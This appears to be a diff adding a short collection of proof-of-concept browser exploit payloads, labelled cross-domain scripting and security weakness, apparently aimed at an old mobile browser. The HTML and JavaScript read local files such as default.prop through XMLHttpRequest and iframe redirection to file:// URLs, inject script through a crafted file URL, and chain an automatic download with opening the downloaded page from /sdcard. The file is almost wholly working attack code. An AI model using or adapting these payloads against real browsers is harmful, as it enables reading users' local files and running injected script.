@@ -1,0 +1,68 @@
+Cross-domain scripting:
+1. 
+
+<script>
+var request = false;
+        if(window.XMLHttpRequest) {
+            request = new XMLHttpRequest();
+            if(request.overrideMimeType) {
+                request.overrideMimeType('text/xml');
+            }
+        } else if(window.ActiveXObject) {
+            var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 
+            'Microsoft.XMLHTTP', 
+            'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 
+            'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
+            for(var i=0; i<versions.length; i++) {
+                try {
+                    request = new ActiveXObject(versions[i]);
+                } catch(e) {}
+            }
+        }
+               
+xmlhttp=request;
+
+//xmlhttp.open("GET", "file://///default.prop", false);
+//xmlhttp.open("GET", "http://www.80vul.com/", false);
+xmlhttp.send(null);
+var ret = xmlhttp.responseText;
+
+alert(ret);
+</script>
+
+
+2. 
+
+<iframe name=f src="location.php" ></iframe> 
+<script> 
+function init(){ 
+  f.location = "file:///default.prop"; 
+} 
+setTimeout(init,5000) 
+</script> 
+
+
+Security Weakness:
+
+1.
+
+<iframe name=f src="location.php" ></iframe> 
+<script> 
+function init(){ 
+  f.location = "file:///ssss<sc"+"ript>alert(1);</sc"+"ript>/";
+} 
+setTimeout(init,5000) 
+</script> 
+
+2.
+
+<meta http-equiv="refresh" content="0;URL=autodown.php"/> 
+<iframe name=f src="location.php" ></iframe> 
+<script> 
+function init(){ 
+  f.location = "file:///sdcard/Download/autodown.htm"; 
+} 
+setTimeout(init,5000) 
+</script> 
+
+
